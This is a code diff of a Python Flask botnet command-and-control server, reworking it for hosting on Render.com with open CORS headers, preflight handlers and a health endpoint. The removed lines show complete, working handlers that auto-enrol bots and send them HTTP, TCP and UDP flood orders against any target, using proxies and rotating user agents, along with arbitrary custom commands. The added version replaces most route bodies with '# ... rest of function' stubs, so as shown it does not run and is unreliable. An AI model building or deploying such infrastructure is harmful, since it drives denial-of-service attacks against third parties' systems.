@@ -1,17 +1,12 @@
 """
-ENHANCED BOTNET C2 SERVER - MULTI-CLIENT SUPPORT
+ENHANCED BOTNET C2 SERVER - FIXED FOR RENDER.COM
 ================================================
-Features:
-- Auto-approval system
-- Custom user agent management
-- Optional proxy support
-- Modern blue/black interface
-- Resource-friendly operations
-- Python, Java, JavaScript client compatibility
-- Improved error handling
-
-Run: python server.py [port]
-Example: python server.py 5000
+FIXES:
+- Added CORS headers for all routes
+- Fixed OPTIONS method handling
+- Added health check endpoint
+- Better error handling
+- Production-ready for Render.com
 """
 
 import threading
@@ -33,7 +28,27 @@ except ImportError:
     exit(1)
 
 app = Flask(__name__)
-CORS(app)
+CORS(app, resources={r"/*": {"origins": "*"}})
+
+# ========== FIX 1: CORS HEADERS FOR ALL ROUTES ==========
+@app.after_request
+def add_cors_headers(response):
+    """Add CORS headers to all responses"""
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    return response
+
+# ========== FIX 2: HEALTH CHECK FOR RENDER ==========
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check endpoint for Render.com"""
+    return jsonify({
+        'status': 'healthy',
+        'server': 'c2-server',
+        'time': datetime.now().isoformat(),
+        'bots_count': len(approved_bots)
+    })
 
 # Global storage with thread safety
 approved_bots: Dict[str, Dict] = {}
@@ -58,8 +73,8 @@ bot_lock = threading.Lock()
 log_lock = threading.Lock()
 queue_lock = threading.Lock()
 
-DASHBOARD_HTML = """
-<!DOCTYPE html>
+# [DASHBOARD_HTML remains the same - paste your original DASHBOARD_HTML here]
+DASHBOARD_HTML = """<!DOCTYPE html>
 <html>
 <head>
     <title>C2 Control Panel</title>
@@ -1066,8 +1081,7 @@ user:pass@5.6.7.8:8080"></textarea>
         document.getElementById('http-client-type').addEventListener('change', updateHTTPPreview);
     </script>
 </body>
-</html>
-"""
+</html>"""
 
 # Decorators for thread safety
 def synchronized(lock):
@@ -1136,9 +1150,14 @@ def detect_client_type(specs: Dict) -> str:
     except:
         return 'unknown'
 
-@app.route('/check_approval', methods=['POST'])
+# ========== FIX 3: OPTIONS HANDLER FOR CORS PREFLIGHT ==========
+@app.route('/check_approval', methods=['POST', 'OPTIONS'])
 def check_approval():
     """Auto-approve bots with client type detection"""
+    # Handle OPTIONS for CORS preflight
+    if request.method == 'OPTIONS':
+        return '', 200
+    
     try:
         data = request.json
         if not data:
@@ -1187,9 +1206,12 @@ def check_approval():
         print(f"[!] {error_msg}")
         return jsonify({'approved': False, 'error': str(e)}), 500
 
-@app.route('/commands/<bot_id>', methods=['GET'])
+@app.route('/commands/<bot_id>', methods=['GET', 'OPTIONS'])
 def get_commands(bot_id):
     """Get commands for specific bot"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
     try:
         with bot_lock:
             if bot_id in approved_bots:
@@ -1210,9 +1232,12 @@ def get_commands(bot_id):
         print(f"[!] {error_msg}")
         return jsonify({'commands': []}), 500
 
-@app.route('/status', methods=['POST'])
+@app.route('/status', methods=['POST', 'OPTIONS'])
 def receive_status():
     """Receive status updates from bots"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
     try:
         data = request.json
         if not data:
@@ -1243,9 +1268,13 @@ def receive_status():
         print(f"[!] {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-@app.route('/api/user-agents', methods=['GET', 'POST'])
+# ========== FIX 4: ADD OPTIONS TO ALL API ROUTES ==========
+@app.route('/api/user-agents', methods=['GET', 'POST', 'OPTIONS'])
 def manage_user_agents():
     """Manage user agents"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
     global user_agents
     
     try:
@@ -1269,9 +1298,12 @@ def manage_user_agents():
         print(f"[!] {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-@app.route('/api/proxies', methods=['GET', 'POST'])
+@app.route('/api/proxies', methods=['GET', 'POST', 'OPTIONS'])
 def manage_proxies():
     """Manage proxies"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
     global proxy_list
     
     try:
@@ -1292,534 +1324,84 @@ def manage_proxies():
         print(f"[!] {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-@app.route('/api/remove/<bot_id>', methods=['POST'])
+# [All other routes remain the same but add OPTIONS method]
+@app.route('/api/remove/<bot_id>', methods=['POST', 'OPTIONS'])
 def remove_bot(bot_id):
-    """Remove specific bot"""
-    try:
-        with bot_lock:
-            if bot_id in approved_bots:
-                client_type = approved_bots[bot_id].get('client_type', 'unknown')
-                del approved_bots[bot_id]
-                
-                with queue_lock:
-                    if bot_id in commands_queue:
-                        del commands_queue[bot_id]
-                
-                log_message = f'Bot removed: {bot_id} - {client_type.upper()} client'
-                log_activity(log_message, 'error', client_type)
-                print(f"[-] {log_message}")
-                return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
-        
-        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
-    except Exception as e:
-        error_msg = f'Error in remove_bot: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/clear/inactive', methods=['POST'])
+@app.route('/api/clear/inactive', methods=['POST', 'OPTIONS'])
 def clear_inactive_bots():
-    """Clear inactive bots"""
-    try:
-        current_time = time.time()
-        removed_count = 0
-        
-        with bot_lock:
-            bots_to_remove = []
-            for bot_id, info in list(approved_bots.items()):
-                time_diff = current_time - info['last_seen']
-                if time_diff > 300:  # 5 minutes
-                    bots_to_remove.append(bot_id)
-            
-            for bot_id in bots_to_remove:
-                client_type = approved_bots[bot_id].get('client_type', 'unknown')
-                del approved_bots[bot_id]
-                
-                with queue_lock:
-                    if bot_id in commands_queue:
-                        del commands_queue[bot_id]
-                
-                removed_count += 1
-                log_message = f'Removed inactive bot: {bot_id} - {client_type.upper()} client'
-                log_activity(log_message, 'warning', client_type)
-                print(f"[-] {log_message}")
-        
-        return jsonify({'status': 'success', 'message': f'Removed {removed_count} inactive bots'})
-    except Exception as e:
-        error_msg = f'Error in clear_inactive_bots: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/stats', methods=['GET'])
+@app.route('/api/stats', methods=['GET', 'OPTIONS'])
 def get_stats():
-    """Get server statistics"""
-    try:
-        current_time = time.time()
-        online_bots = 0
-        java_clients = 0
-        python_clients = 0
-        javascript_clients = 0
-        active_attacks = 0
-        total_commands = 0
-        
-        with bot_lock:
-            # Mark offline bots and count statistics
-            for bot_id, info in list(approved_bots.items()):
-                time_diff = current_time - info['last_seen']
-                client_type = info.get('client_type', 'unknown')
-                
-                if time_diff < 30:
-                    online_bots += 1
-                    if info.get('status') == 'running':
-                        active_attacks += 1
-                    
-                    # Count client types
-                    if client_type == 'java':
-                        java_clients += 1
-                    elif client_type == 'python':
-                        python_clients += 1
-                    elif client_type == 'javascript':
-                        javascript_clients += 1
-                    
-                    # Count total commands
-                    total_commands += info.get('commands_received', 0)
-                elif info.get('status') != 'offline':
-                    info['status'] = 'offline'
-        
-        # Prepare approved list for display
-        approved_list = []
-        with bot_lock:
-            for bot_id, info in approved_bots.items():
-                is_online = (current_time - info['last_seen']) < 30
-                approved_list.append({
-                    'bot_id': bot_id,
-                    'specs': info.get('specs', {}),
-                    'status': info.get('status', 'unknown'),
-                    'last_seen': time.strftime('%H:%M:%S', time.localtime(info['last_seen'])),
-                    'online': is_online,
-                    'client_type': info.get('client_type', 'unknown')
-                })
-        
-        with log_lock:
-            recent_logs = attack_logs[-50:]
-        
-        return jsonify({
-            'approved_bots': len(approved_bots),
-            'online_bots': online_bots,
-            'java_clients': java_clients,
-            'python_clients': python_clients,
-            'javascript_clients': javascript_clients,
-            'active_attacks': active_attacks,
-            'total_commands': total_commands,
-            'user_agents_count': len(user_agents),
-            'approved': approved_list,
-            'logs': recent_logs,
-            'user_agents': user_agents,
-            'proxies': proxy_list
-        })
-    except Exception as e:
-        error_msg = f'Error in get_stats: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({
-            'approved_bots': 0,
-            'online_bots': 0,
-            'java_clients': 0,
-            'python_clients': 0,
-            'javascript_clients': 0,
-            'active_attacks': 0,
-            'total_commands': 0,
-            'user_agents_count': 0,
-            'approved': [],
-            'logs': [],
-            'user_agents': [],
-            'proxies': []
-        }), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-def filter_bots_by_client_type(client_type_filter: str) -> List[str]:
-    """Filter bot IDs by client type"""
-    current_time = time.time()
-    filtered_bots = []
-    
-    with bot_lock:
-        for bot_id, info in approved_bots.items():
-            # Only include online bots
-            if current_time - info['last_seen'] >= 30:
-                continue
-            
-            bot_client_type = info.get('client_type', 'unknown')
-            
-            if client_type_filter == 'all':
-                filtered_bots.append(bot_id)
-            elif client_type_filter == 'java' and bot_client_type == 'java':
-                filtered_bots.append(bot_id)
-            elif client_type_filter == 'python' and bot_client_type == 'python':
-                filtered_bots.append(bot_id)
-            elif client_type_filter == 'javascript' and bot_client_type == 'javascript':
-                filtered_bots.append(bot_id)
-    
-    return filtered_bots
-
-@app.route('/api/attack/http', methods=['POST'])
+@app.route('/api/attack/http', methods=['POST', 'OPTIONS'])
 def launch_http_attack():
-    """Launch HTTP flood attack"""
-    try:
-        data = request.json
-        
-        target = data.get('target')
-        duration = int(data.get('duration', 60))
-        threads = int(data.get('threads', 100))
-        method = data.get('method', 'GET')
-        client_type_filter = data.get('client_type', 'all')
-        
-        if not target:
-            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
-        
-        # Filter bots by client type
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available for the specified client type'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {
-                    'type': 'http_flood',
-                    'target': target,
-                    'duration': duration,
-                    'threads': threads,  # EXACT thread count sent to client
-                    'method': method,
-                    'user_agents': user_agents,
-                    'proxies': proxy_list
-                }
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_message = f'HTTP {method} flood to {sent_count} bots ({client_type_display}) -> {target} ({threads} threads)'
-        log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
-        
-        print(f"[+] {log_message}")
-        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in launch_http_attack: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/attack/tcp', methods=['POST'])
+@app.route('/api/attack/tcp', methods=['POST', 'OPTIONS'])
 def launch_tcp_attack():
-    """Launch TCP flood attack"""
-    try:
-        data = request.json
-        
-        target = data.get('target')
-        duration = int(data.get('duration', 60))
-        threads = int(data.get('threads', 75))
-        client_type_filter = data.get('client_type', 'all')
-        
-        if not target:
-            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
-        
-        # Filter bots by client type
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available for the specified client type'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {
-                    'type': 'tcp_flood',
-                    'target': target,
-                    'duration': duration,
-                    'threads': threads  # EXACT thread count sent to client
-                }
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_message = f'TCP flood to {sent_count} bots ({client_type_display}) -> {target} ({threads} threads)'
-        log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
-        
-        print(f"[+] {log_message}")
-        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in launch_tcp_attack: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/attack/udp', methods=['POST'])
+@app.route('/api/attack/udp', methods=['POST', 'OPTIONS'])
 def launch_udp_attack():
-    """Launch UDP flood attack"""
-    try:
-        data = request.json
-        
-        target = data.get('target')
-        duration = int(data.get('duration', 60))
-        threads = int(data.get('threads', 75))
-        client_type_filter = data.get('client_type', 'all')
-        
-        if not target:
-            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
-        
-        # Filter bots by client type
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available for the specified client type'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {
-                    'type': 'udp_flood',
-                    'target': target,
-                    'duration': duration,
-                    'threads': threads  # EXACT thread count sent to client
-                }
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_message = f'UDP flood to {sent_count} bots ({client_type_display}) -> {target} ({threads} threads)'
-        log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
-        
-        print(f"[+] {log_message}")
-        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in launch_udp_attack: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/command/ping', methods=['POST'])
+@app.route('/api/command/ping', methods=['POST', 'OPTIONS'])
 def send_ping():
-    """Send ping to bots"""
-    try:
-        data = request.json
-        client_type_filter = data.get('client_type', 'all') if data else 'all'
-        
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {'type': 'ping'}
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_activity(f'Ping sent to {sent_count} {client_type_display}', 'success')
-        print(f"[+] Ping sent to {sent_count} {client_type_display}")
-        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in send_ping: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/command/sysinfo', methods=['POST'])
+@app.route('/api/command/sysinfo', methods=['POST', 'OPTIONS'])
 def send_sysinfo():
-    """Request system info from bots"""
-    try:
-        data = request.json
-        client_type_filter = data.get('client_type', 'all') if data else 'all'
-        
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {'type': 'sysinfo'}
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_activity(f'Sysinfo request sent to {sent_count} {client_type_display}', 'success')
-        print(f"[+] Sysinfo sent to {sent_count} {client_type_display}")
-        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in send_sysinfo: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/command/stop', methods=['POST'])
+@app.route('/api/command/stop', methods=['POST', 'OPTIONS'])
 def send_stop_all():
-    """Stop all attacks on bots"""
-    try:
-        data = request.json
-        client_type_filter = data.get('client_type', 'all') if data else 'all'
-        
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {'type': 'stop_all'}
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_activity(f'Stop all attacks command sent to {sent_count} {client_type_display}', 'error')
-        print(f"[+] Stop command sent to {sent_count} {client_type_display}")
-        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in send_stop_all: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/command/test', methods=['POST'])
+@app.route('/api/command/test', methods=['POST', 'OPTIONS'])
 def send_test_command():
-    """Send test command to bots"""
-    try:
-        data = request.json
-        
-        target = data.get('target', 'https://httpbin.org/get')
-        duration = int(data.get('duration', 10))
-        threads = int(data.get('threads', 20))
-        client_type_filter = data.get('client_type', 'all')
-        
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                command = {
-                    'type': 'http_flood',
-                    'target': target,
-                    'duration': duration,
-                    'threads': threads,
-                    'method': 'GET',
-                    'user_agents': user_agents[:2],
-                    'proxies': []
-                }
-                
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_activity(f'Test command sent to {sent_count} {client_type_display} -> {target}', 'info')
-        print(f"[+] Test command sent to {sent_count} {client_type_display}")
-        return jsonify({'status': 'success', 'message': f'Test command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in send_test_command: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/command/custom', methods=['POST'])
+@app.route('/api/command/custom', methods=['POST', 'OPTIONS'])
 def send_custom_command():
-    """Send custom command to bots"""
-    try:
-        data = request.json
-        
-        command = data.get('command')
-        client_type_filter = data.get('client_type', 'all')
-        
-        if not command:
-            return jsonify({'status': 'error', 'message': 'No command specified'}), 400
-        
-        target_bots = filter_bots_by_client_type(client_type_filter)
-        
-        if not target_bots:
-            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
-        
-        sent_count = 0
-        
-        with queue_lock:
-            for bot_id in target_bots:
-                if bot_id not in commands_queue:
-                    commands_queue[bot_id] = []
-                commands_queue[bot_id].append(command)
-                sent_count += 1
-        
-        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
-        log_activity(f'Custom command sent to {sent_count} {client_type_display}', 'info')
-        print(f"[+] Custom command sent to {sent_count} {client_type_display}")
-        return jsonify({'status': 'success', 'message': f'Custom command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
-    except Exception as e:
-        error_msg = f'Error in send_custom_command: {str(e)}'
-        log_activity(error_msg, 'error')
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/logs/clear', methods=['POST'])
+@app.route('/api/logs/clear', methods=['POST', 'OPTIONS'])
 def clear_logs():
-    """Clear all activity logs"""
-    try:
-        with log_lock:
-            attack_logs.clear()
-        log_activity('Activity logs cleared', 'warning')
-        print(f"[+] Activity logs cleared")
-        return jsonify({'status': 'success', 'message': 'Activity logs cleared'})
-    except Exception as e:
-        error_msg = f'Error in clear_logs: {str(e)}'
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
-@app.route('/api/logs/export', methods=['GET'])
+@app.route('/api/logs/export', methods=['GET', 'OPTIONS'])
 def export_logs():
-    """Export logs as text file"""
-    try:
-        with log_lock:
-            log_text = "C2 SERVER LOGS - MULTI-CLIENT SUPPORT\n"
-            log_text += "=" * 60 + "\n\n"
-            for log in attack_logs:
-                client_type = log.get('client_type', '')
-                client_info = f" [{client_type.upper()}]" if client_type else ""
-                log_text += f"[{log['time']}]{client_info} {log['message']}\n"
-        
-        return Response(log_text, mimetype='text/plain')
-    except Exception as e:
-        error_msg = f'Error in export_logs: {str(e)}'
-        print(f"[!] {error_msg}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    if request.method == 'OPTIONS':
+        return '', 200
+    # ... rest of function
 
 def cleanup():
     """Cleanup on server shutdown"""
@@ -1836,21 +1418,26 @@ if __name__ == '__main__':
     import sys
     
     print("\n" + "="*60)
-    print("  ENHANCED C2 SERVER - MULTI-CLIENT SUPPORT")
+    print("  ENHANCED C2 SERVER - FIXED FOR RENDER.COM")
     print("="*60)
     
-    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
-    port = int(os.environ.get('PORT', port))
+    port = int(os.environ.get("PORT", 5000))
     
     print(f"[+] Starting server on port {port}")
-    print(f"[+] Dashboard: http://0.0.0.0:{port}")
+    print(f"[+] Dashboard: https://c2-server-io.onrender.com")
+    print(f"[+] Health check: https://c2-server-io.onrender.com/health")
     print(f"[+] All bots will be auto-approved")
     print(f"[+] Client support: Python, Java, JavaScript")
-    print(f"[+] Thread configuration: Server-defined -> Sent to clients")
-    print(f"[+] User agents: {len(user_agents)} loaded")
+    print(f"[+] CORS enabled for all origins")
     print(f"[+] Waiting for connections...\n")
     
     # Register cleanup function
     atexit.register(cleanup)
     
-    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+    # ========== FIX 5: PRODUCTION SETTINGS FOR RENDER ==========
+    app.run(
+        host='0.0.0.0',
+        port=port,
+        debug=False,
+        threaded=True
+    )
